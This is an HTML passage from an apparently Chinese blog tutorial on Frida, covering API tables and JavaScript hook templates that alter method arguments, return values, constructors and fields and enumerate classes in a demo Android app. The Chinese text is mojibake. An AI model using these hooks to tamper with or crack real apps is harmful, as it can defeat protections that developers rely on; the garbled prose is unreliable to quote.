id="ï¼ˆ4ï¼‰åŸºç¡€è¯­æ³•">ï¼ˆ4ï¼‰åŸºç¡€è¯­æ³•</h3><table><thead><tr><th style="text-align:left">APIåç§°</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left"><code>Java.use(className)</code></td><td style="text-align:left">è·å–æŒ‡å®šçš„Javaç±»å¹¶ä½¿å…¶åœ¨JavaScriptä»£ç ä¸­å¯ç”¨ã€‚</td></tr><tr><td style="text-align:left"><code>Java.perform(callback)</code></td><td style="text-align:left">ç¡®ä¿å›è°ƒå‡½æ•°åœ¨Javaçš„ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œã€‚</td></tr><tr><td style="text-align:left"><code>Java.choose(className, callbacks)</code></td><td style="text-align:left">æšä¸¾æŒ‡å®šç±»çš„æ‰€æœ‰å®ä¾‹ã€‚</td></tr><tr><td style="text-align:left"><code>Java.cast(obj, cls)</code></td><td style="text-align:left">å°†ä¸€ä¸ªJavaå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªJavaç±»çš„å®ä¾‹ã€‚</td></tr><tr><td style="text-align:left"><code>Java.enumerateLoadedClasses(callbacks)</code></td><td style="text-align:left">æšä¸¾è¿›ç¨‹ä¸­å·²ç»åŠ è½½çš„æ‰€æœ‰Javaç±»ã€‚</td></tr><tr><td style="text-align:left"><code>Java.enumerateClassLoaders(callbacks)</code></td><td style="text-align:left">æšä¸¾è¿›ç¨‹ä¸­å­˜åœ¨çš„æ‰€æœ‰Javaç±»åŠ è½½å™¨ã€‚</td></tr><tr><td style="text-align:left"><code>Java.enumerateMethods(targetClassMethod)</code></td><td style="text-align:left">æšä¸¾æŒ‡å®šç±»çš„æ‰€æœ‰æ–¹æ³•ã€‚</td></tr></tbody></table><h3 id="ï¼ˆ5ï¼‰æ—¥å¿—è¾“å‡ºè¯­æ³•åŒºåˆ«">ï¼ˆ5ï¼‰æ—¥å¿—è¾“å‡ºè¯­æ³•åŒºåˆ«</h3><table><thead><tr><th style="text-align:left">æ—¥å¿—æ–¹æ³•</th><th style="text-align:left">æè¿°</th><th style="text-align:left">åŒºåˆ«</th></tr></thead><tbody><tr><td style="text-align:left"><code>console.log()</code></td><td style="text-align:left">ä½¿ç”¨JavaScriptç›´æ¥è¿›è¡Œæ—¥å¿—æ‰“å°</td><td style="text-align:left">å¤šç”¨äºåœ¨CLIæ¨¡å¼ä¸­ï¼Œ<code>console.log()</code>ç›´æ¥è¾“å‡ºåˆ°å‘½ä»¤è¡Œç•Œé¢ï¼Œä½¿ç”¨æˆ·å¯ä»¥å®æ—¶æŸ¥çœ‹ã€‚åœ¨RPCæ¨¡å¼ä¸­ï¼Œ<code>console.log()</code>åŒæ ·è¾“å‡ºåœ¨å‘½ä»¤è¡Œï¼Œä½†å¯èƒ½è¢«Pythonè„šæœ¬çš„è¾“å‡ºå†…å®¹æ©ç›–ã€‚</td></tr><tr><td style="text-align:left"><code>send()</code></td><td style="text-align:left">Fridaçš„ä¸“æœ‰æ–¹æ³•ï¼Œç”¨äºå‘é€æ•°æ®æˆ–æ—¥å¿—åˆ°å¤–éƒ¨Pythonè„šæœ¬</td><td style="text-align:left">å¤šç”¨äºRPCæ¨¡å¼ä¸­ï¼Œå®ƒå…è®¸JavaScriptè„šæœ¬å‘é€æ•°æ®åˆ°Pythonè„šæœ¬ï¼ŒPythonè„šæœ¬å¯ä»¥è¿›ä¸€æ­¥å¤„ç†æˆ–è®°å½•è¿™äº›æ•°æ®ã€‚</td></tr></tbody></table><h3 id="ï¼ˆ6ï¼‰Hookæ¡†æ¶æ¨¡ç‰ˆ">ï¼ˆ6ï¼‰Hookæ¡†æ¶æ¨¡ç‰ˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">hookTest1</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h2 id="å››ã€Fridaå¸¸ç”¨API">å››ã€Fridaå¸¸ç”¨API</h2><h3 id="ï¼ˆ1ï¼‰Hookæ™®é€šæ–¹æ³•ã€æ‰“å°å‚æ•°å’Œä¿®æ”¹è¿”å›å€¼">ï¼ˆ1ï¼‰Hookæ™®é€šæ–¹æ³•ã€æ‰“å°å‚æ•°å’Œä¿®æ”¹è¿”å›å€¼</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªåä¸ºhookTest1çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//è·å–ä¸€ä¸ªåä¸º&quot;ç±»å&quot;çš„Javaç±»ï¼Œå¹¶å°†å…¶å®ä¾‹èµ‹å€¼ç»™JavaScriptå˜é‡utils</span></span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">    <span class="comment">//ä¿®æ”¹&quot;ç±»å&quot;çš„&quot;method&quot;æ–¹æ³•çš„å®ç°ã€‚è¿™ä¸ªæ–°çš„å®ç°ä¼šæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼ˆaå’Œbï¼‰</span></span><br><span class="line">    utils.<span class="property">method</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            <span class="comment">//å°†å‚æ•°aå’Œbçš„å€¼æ”¹ä¸º123å’Œ456ã€‚</span></span><br><span class="line">        a = <span class="number">123</span>;</span><br><span class="line">        b = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//è°ƒç”¨ä¿®æ”¹è¿‡çš„&quot;method&quot;æ–¹æ³•ï¼Œå¹¶å°†è¿”å›å€¼å­˜å‚¨åœ¨`retval`å˜é‡ä¸­</span></span><br><span class="line">        <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">method</span>(a, b);</span><br><span class="line">        <span class="comment">//åœ¨æ§åˆ¶å°ä¸Šæ‰“å°å‚æ•°aï¼Œbçš„å€¼ä»¥åŠ&quot;method&quot;æ–¹æ³•çš„è¿”å›å€¼</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, retval);</span><br><span class="line">        <span class="comment">//è¿”å›&quot;method&quot;æ–¹æ³•çš„è¿”å›å€¼</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ2ï¼‰Hooké‡è½½å‚æ•°">ï¼ˆ2ï¼‰Hooké‡è½½å‚æ•°</h3><p>å‡½æ•°åç§°ç›¸åŒï¼Œä½†æ˜¯å‡½æ•°ä¼ å…¥çš„å‚æ•°ç±»å‹ä¸åŒï¼Œè¿™ä¸ªå°±æ˜¯é‡è½½ã€‚å‡½æ•°çš„é‡è½½å¯¼è‡´ä¼šå¯¼è‡´<code>frida</code>ä¸çŸ¥é“å…·ä½“åº”è¯¥<code>Hook</code>å“ªä¸ªå‡½æ•°è€Œå‡ºç°çš„é—®é¢˜ã€‚è¿™æ—¶å€™è¦åœ¨ä»£ç ä¸­åŠ å…¥è¦<code>Hook</code>çš„<strong>å‡½æ•°çš„å‚æ•°ç±»å‹</strong>ï¼Œè¿™æ ·å°±ä¸ä¼šæŠ¥é”™äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .overload()</span></span><br><span class="line"><span class="comment">// .overload(&#x27;è‡ªå®šä¹‰å‚æ•°&#x27;)</span></span><br><span class="line"><span class="comment">// .overload(&#x27;int&#x27;)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//overloadå®šä¹‰é‡è½½å‡½æ•°ï¼Œæ ¹æ®å‡½æ•°çš„å‚æ•°ç±»å‹å¡«</span></span><br><span class="line">    utils.<span class="property">Inner</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">aï¼Œb</span>)&#123;</span><br><span class="line">        b = <span class="string">&quot;aaaaaaaaaa&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title class_">Inner</span>(a,b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ3ï¼‰Hookæ„é€ å‡½æ•°">ï¼ˆ3ï¼‰Hookæ„é€ å‡½æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//ä¿®æ”¹ç±»çš„æ„é€ å‡½æ•°çš„å®ç°ï¼Œ$initè¡¨ç¤ºæ„é€ å‡½æ•°</span></span><br><span class="line">    utils.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">        str = <span class="string">&quot;52&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ4ï¼‰Hookå­—æ®µ">ï¼ˆ4ï¼‰Hookå­—æ®µ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//é™æ€å­—æ®µçš„ä¿®æ”¹</span></span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//ä¿®æ”¹ç±»çš„é™æ€å­—æ®µ&quot;flag&quot;çš„å€¼</span></span><br><span class="line">        utils.<span class="property">staticField</span>.<span class="property">value</span> = <span class="string">&quot;æˆ‘æ˜¯è¢«ä¿®æ”¹çš„é™æ€å˜é‡&quot;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(utils.<span class="property">staticField</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="comment">//éé™æ€å­—æ®µçš„ä¿®æ”¹</span></span><br><span class="line">        <span class="comment">//ä½¿ç”¨`Java.choose()`æšä¸¾ç±»çš„æ‰€æœ‰å®ä¾‹</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                    <span class="comment">//ä¿®æ”¹å®ä¾‹çš„éé™æ€å­—æ®µ&quot;_privateInt&quot;çš„å€¼ä¸º&quot;123456&quot;ï¼Œå¹¶ä¿®æ”¹éé™æ€å­—æ®µ&quot;privateInt&quot;çš„å€¼ä¸º9999ã€‚</span></span><br><span class="line">                obj.<span class="property">_privateInt</span>.<span class="property">value</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">//å­—æ®µåä¸å‡½æ•°åç›¸åŒ å‰é¢åŠ ä¸ªä¸‹åˆ’çº¿</span></span><br><span class="line">                obj.<span class="property">privateInt</span>.<span class="property">value</span> = <span class="number">9999</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ5ï¼‰Hookå†…éƒ¨ç±»">ï¼ˆ5ï¼‰Hookå†…éƒ¨ç±»</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//å†…éƒ¨ç±»</span></span><br><span class="line">        <span class="keyword">var</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(innerClass);</span><br><span class="line">        innerClass.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eeeeeeee&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ6ï¼‰æšä¸¾æ‰€æœ‰çš„ç±»ä¸ç±»çš„æ‰€æœ‰æ–¹æ³•">ï¼ˆ6ï¼‰æšä¸¾æ‰€æœ‰çš„ç±»ä¸ç±»çš„æ‰€æœ‰æ–¹æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//æšä¸¾æ‰€æœ‰çš„ç±»ä¸ç±»çš„æ‰€æœ‰æ–¹æ³•,å¼‚æ­¥æšä¸¾</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">                    <span class="comment">//è¿‡æ»¤ç±»å</span></span><br><span class="line">                <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>) !=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                    <span class="keyword">var</span> clazz =<span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(clazz);</span><br><span class="line">                    <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ7ï¼‰æšä¸¾æ‰€æœ‰æ–¹æ³•">ï¼ˆ7ï¼‰æšä¸¾æ‰€æœ‰æ–¹æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Demo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//getDeclaredMethodsæšä¸¾æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">var</span> methods =<span class="title class_">Demo</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>; k&lt;<span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>.<span class="property">length</span>;k++)&#123;</span><br><span class="line">                <span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>[k].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ8ï¼‰ä¸»åŠ¨è°ƒç”¨">ï¼ˆ8ï¼‰ä¸»åŠ¨è°ƒç”¨</h3><ul><li>é™æ€æ–¹æ³•</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ClassName</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>); </span><br><span class="line"><span class="title class_">ClassName</span>.<span class="title function_">privateFunc</span>(<span class="string">&quot;ä¼ å‚&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>éé™æ€æ–¹æ³•</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="comment">//è¦hookçš„ç±»</span></span><br><span class="line">        <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            ret=instance.<span class="title function_">privateFunc</span>(<span class="string">&quot;aaaaaaa&quot;</span>); <span class="comment">//è¦hookçš„æ–¹æ³•</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//return ret;</span></span><br></pre></td></tr></table></figure><h2 id="äº”ã€Javaå±‚çš„ä¸»åŠ¨è°ƒç”¨">äº”ã€Javaå±‚çš„ä¸»åŠ¨è°ƒç”¨</h2><p><strong>ä¸»åŠ¨è°ƒç”¨</strong>å°±æ˜¯å¼ºåˆ¶è°ƒç”¨ä¸€ä¸ªå‡½æ•°å»æ‰§è¡Œã€‚ç›¸å¯¹åœ°ï¼Œ<strong>è¢«åŠ¨è°ƒç”¨</strong>æ˜¯ç”±AppæŒ‰ç…§æ­£å¸¸é€»è¾‘å»æ‰§è¡Œå‡½æ•°ï¼Œå‡½æ•°çš„æ‰§è¡Œå®Œå…¨ä¾é ä¸ç”¨æˆ·äº¤äº’å®Œæˆç¨‹åºé€»è¾‘è¿›è€Œé—´æ¥è°ƒç”¨åˆ°å…³é”®å‡½æ•°ï¼Œè€Œä¸»åŠ¨è°ƒç”¨åˆ™å¯ä»¥ç›´æ¥è°ƒç”¨å…³é”®å‡½æ•°ï¼Œä¸»åŠ¨æ€§æ›´å¼ºï¼Œç”šè‡³å¯ä»¥ç›´æ¥å®Œæˆå…³é”®æ•°æ®çš„â€œè‡ªåâ€ã€‚</p><p>åœ¨<code>Java</code>ä¸­ï¼Œç±»ä¸­çš„å‡½æ•°å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼š<strong>ç±»å‡½æ•°å’Œå®ä¾‹æ–¹æ³•</strong>ã€‚é€šä¿—çš„è®²ï¼Œå°±æ˜¯<strong>é™æ€æ–¹æ³•å’ŒåŠ¨æ€æ–¹æ³•</strong>ã€‚</p><p><strong>ç±»å‡½æ•°</strong>ä½¿ç”¨å…³é”®å­—<code>static</code>ä¿®é¥°ï¼Œå’Œå¯¹åº”ç±»æ˜¯ç»‘å®šçš„ï¼Œå¦‚æœç±»å‡½æ•°è¿˜è¢«<code>public</code>å…³é”®å­—ä¿®é¥°ç€ï¼Œåœ¨å¤–éƒ¨å°±å¯ä»¥ç›´æ¥é€šè¿‡ç±»å»è°ƒç”¨ã€‚</p><p>å®ä¾‹æ–¹æ³•åˆ™æ²¡æœ‰å…³é”®å­—<code>static</code>ä¿®é¥°ï¼Œåœ¨å¤–éƒ¨<strong>åªèƒ½é€šè¿‡åˆ›å»ºå¯¹åº”ç±»çš„å®ä¾‹</strong>å†é€šè¿‡è¿™ä¸ªå®ä¾‹å»è°ƒç”¨ã€‚</p><blockquote><p>åœ¨<code>Frida</code>ä¸­ä¸»åŠ¨è°ƒç”¨çš„ç±»å‹ä¼šæ ¹æ®æ–¹æ³•ç±»å‹åŒºåˆ†å¼€ã€‚å¦‚æœæ˜¯ç±»å‡½æ•°çš„ä¸»åŠ¨è°ƒç”¨ï¼Œç›´æ¥ä½¿ç”¨<code>Java.use()</code>å‡½æ•°æ‰¾åˆ°å¯¹åº”çš„å®ä¾‹åå¯¹æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚å¦‚æœæ˜¯å®ä¾‹æ–¹æ³•çš„ä¸»åŠ¨è°ƒç”¨ï¼Œåˆ™éœ€è¦åœ¨æ‰¾åˆ°å¯¹åº”çš„å®ä¾‹åå¯¹æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚è¿™é‡Œç”¨åˆ°äº†<code>Frida</code>ä¸­éå¸¸é‡è¦çš„ä¸€ä¸ª<code>API</code>å‡½æ•°<code>Java.choose()</code>ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥åœ¨<code>Java</code>çš„å †ä¸­å¯»æ‰¾æŒ‡å®šç±»çš„å®ä¾‹ã€‚</p></blockquote><p>ç¤ºä¾‹ä»£ç <code>MainActivity.java</code>ï¼š</p><p><img src="/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/image-20250315211933929.png" alt="image-20250315211933929"></p><p><code>Hook</code>å‡½æ•°çš„ä»£ç å¦‚ä¸‹<code>hook.js</code>ï¼š</p><p><img src="/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/image-20250315212408313.png" alt="image-20250315212408313"></p><p>ä»<code>hook.js</code>è¿™ä¸ªè„šæœ¬ä¸­ï¼Œå¯ä»¥å‘ç°é™æ€çš„<code>staticSecret()</code>å‡½æ•°å’Œ<code>Hook</code>æ—¶ä½¿ç”¨çš„æ–¹å¼å¤§åŒå°å¼‚ï¼Œéƒ½æ˜¯ä½¿ç”¨<code>Java.use</code>è¿™ä¸ª<code>API</code>å»è·å–<code>MainActivity</code>ç±»ï¼Œåœ¨è·å–å¯¹åº”çš„ç±»å¯¹è±¡åé€šè¿‡&quot;.&quot;è¿æ¥ç¬¦è¿æ¥<code>staticSecret</code>æ–¹æ³•åï¼Œæœ€ç»ˆä»¥å’Œ<code>Java</code>ä¸­ä¸€æ ·çš„æ–¹å¼ç›´æ¥è°ƒç”¨é™æ€æ–¹æ³•<code>staticSecret()</code>å‡½æ•°ã€‚</p><p>åŠ¨æ€æ–¹æ³•<code>secret</code>éœ€è¦å…ˆé€šè¿‡<code>Java.choose</code>è¿™ä¸ª<code>API</code>ä»å†…å­˜ä¸­è·å–ç›¸åº”ç±»çš„å®ä¾‹å¯¹è±¡ï¼Œç„¶åæ‰èƒ½é€šè¿‡è¿™ä¸ªå®ä¾‹å¯¹è±¡å»è°ƒç”¨åŠ¨æ€çš„<code>secret()</code>å‡½æ•°ã€‚</p><blockquote><p>å¦‚æœéœ€è¦ä¸»åŠ¨è°ƒç”¨åŠ¨æ€å‡½æ•°ï¼Œå¿…é¡»ç¡®ä¿å­˜åœ¨ç›¸åº”ç±»çš„å¯¹è±¡ï¼Œå¦åˆ™æ— æ³•è¿›å…¥<code>Java.choose</code>è¿™ä¸ª<code>API</code>çš„å›è°ƒ<code>onMatch</code>é€»è¾‘ä¸­ã€‚æ¯”å¦‚<code>MainActivity</code>ç±»å¯¹è±¡ï¼Œç”±äº<code>App</code>åœ¨æ‰“å¼€åç¡®å®è¿è¡Œåœ¨<code>MainActivity</code>ç•Œé¢ä¸Šï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å°±ä¸€å®šä¼šå­˜åœ¨ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„â€œæ‰€è§å³æ‰€å¾—â€æ€æƒ³ã€‚</p></blockquote><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://www.52pojie.cn/thread-1823118-1-1.html">https://www.52pojie.cn/thread-1823118-1-1.html</a></p><p>ã€Šå®‰å“Fridaé€†å‘ä¸æŠ“åŒ…å®æˆ˜ã€‹ é™ˆä½³æ—/è‘—</p>]]></content>
      
      
      <categories>
